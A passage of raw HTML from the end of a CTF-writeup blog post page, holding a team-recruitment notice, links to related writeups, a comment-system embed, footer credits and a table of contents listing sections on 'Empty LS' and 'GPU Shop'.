6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section><div class="notice notice-tip"><div class=notice-title><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M504 256A248 248 0 118 256a248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z"/></svg></div><p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><br><p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://blog.zeddyu.info/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p><br></div></footer></article><aside class=related-contents--wrapper><h2 class=section-title>Related contents</h2><div class=related-contents><div class="flex article-list--tile"><article><a href=/2022/02/21/2022-02-21-PracticalTimingTimeless/><div class=article-details><h2 class=article-title>Writeup for A More Secure Pastebin - Practical Timeless Timing in Browser</h2></div></a></article><article><a href=/2022/01/08/2022-01-08-TheEndOfLFI/><div class=article-details><h2 class=article-title>hxp CTF 2021 - The End Of LFI?</h2></div></a></article><article><a href=/2021/12/27/2021-12-20-ANewNovelLFI/><div class=article-details><h2 class=article-title>hxp CTF 2021 - A New Novel LFI</h2></div></a></article><article><a href=/2021/08/02/cybrics-checkin-2021/><div class=article-details><h2 class=article-title>Writeup for Web-Checkin in CyBRICS CTF 2021 (Mirror)</h2></div></a></article><article><a href=/2021/05/19/tls-ctf/><div class=article-details><h2 class=article-title>TLS-Poison 攻击方式在 CTF 中的利用实践</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//ZeddYu.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{DISQUS&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
2018 -
2023 Zeddy's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.2.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous></main><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#empty-ls>Empty LS</a></li><li><a href=#gpu-shop>GPU Shop</a></li><li><a href=#other-webs>Other Webs</a></li></ol></nav></div></section></aside></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous defer></script><script type=text/javascript src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//ts/main.js defer></script>
<script>"serviceWorker"in navigator&&window.addEventListener("load",function(){navigator.serviceWorker.register("/sw.js")})</script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>